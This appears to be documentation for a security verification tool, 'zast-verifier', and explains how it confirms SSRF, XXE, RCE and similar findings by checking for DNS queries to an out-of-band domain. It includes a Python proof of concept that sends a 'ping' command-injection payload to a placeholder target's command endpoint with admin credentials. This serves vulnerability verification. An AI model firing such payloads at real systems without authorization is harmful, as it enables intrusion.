# DNS Log Verification

Use for SSRF, OpenRedirection, XXE, RCE, and any vulnerability that causes network I/O. 
The verification checks if the target server makes a DNS query to the specific OOB domain.

## How It Works

1. Fetch an OOB test domain from the OOB service
2. Replace placeholder in PoC with the actual OOB domain
3. Execute PoC
4. Check if OOB domain received DNS query

## PoC Example

```python
import requests

from zast_verifier import config


if __name__ == "__main__":
    base_url = "https://example.vulnerable.web.app.com"
    oob_domain = "oob.oast.pro"  # Will be replaced with actual OOB domain

    response = requests.post(
        url=f"{base_url}/api/cmd",
        json={"cmd": f"ping {oob_domain}"},
        headers=config.get_admin_headers(),
        cookies=config.get_admin_cookies(),
    )

    print(f"Status code: {response.status_code}")
    print(f"Response text: {response.text}")
```

## Validation Command

```bash
zast-verifier validate-poc -c "%poc_code%" --method dnslog --dnslog-domain-placeholder oob.oast.pro
```

## Parameters

| Parameter                       | Description                                                        | Required |
|---------------------------------|--------------------------------------------------------------------|----------|
| `--method`                      | Use `dnslog` for this verification                                 | Yes      |
| `--dnslog-domain-placeholder`   | Placeholder value in PoC to replace with actual OOB domain         | Yes      |
| `--env-file`                    | Path to environment file (default: `~/.config/zast-verifier/.env`) | No       |

## Notes

- The placeholder must appear in the PoC code
- The placeholder value (e.g., `oob.oast.pro`) will be replaced with an actual OOB domain like `8ip20wfxyq9e.oast.pro`
